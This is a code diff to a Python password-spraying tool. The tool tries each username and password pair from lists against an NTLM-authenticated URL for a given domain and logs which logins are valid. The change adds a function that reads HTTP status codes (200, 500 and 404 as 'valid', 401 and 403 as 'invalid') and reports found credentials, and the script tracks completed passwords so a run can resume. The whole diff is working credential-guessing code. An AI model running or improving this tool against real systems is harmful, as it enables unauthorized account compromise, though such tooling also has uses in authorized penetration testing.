@@ -13,11 +13,25 @@ from pathlib import Path
 def sendrequest(url, username, password, domain, log):
     auth=HttpNtlmAuth("{}\\{}".format(domain, username), password)
     resp = requests.get(url, auth=auth)
+    return resp
 
+def processresponse(resp):
+    isFound = False
     if resp.status_code == 200:
-        log.success("VALID Credentials FOUND: {}\\{}: {}".format(domain, username, password))
+        msg = "VALID"
+        isFound = True
+    elif resp.status_code == 403 or resp.status_code == 401:
+        msg = "INVALID"
+    elif resp.status_code == 500:
+        msg = "VALID (DISABLED?)"
+        isFound = True
+    elif resp.status_code == 404:
+        msg = "VALID (MAYBE?)"
+        isFound = True
     else:
-        log.error("INVALID Credentials: {}\\{}: {}".format(domain, username, password), False)
+        msg = "Unknown status code. You shouldn't be here." 
+
+    return isFound, msg
    
 def main():
     log = messages.message()
@@ -102,7 +116,14 @@ def main():
         pwd = pwd.strip('\n')
         for user in userfile:
             user = user.strip('\n')
-            sendrequest(options.targeturl, user, pwd, options.domain, log)
+            resp = sendrequest(options.targeturl, user, pwd, options.domain, log)
+            isFound, msg = processresponse(resp)
+            logoutput = "{}: {}\\{}: {}".format(msg, options.domain, user, pwd)
+
+            if isFound:
+                log.success(logoutput)
+            else:
+                log.error(logoutput, False)
 
         completed_pwds.write(pwd + '\n')
         completed_pwds.flush()
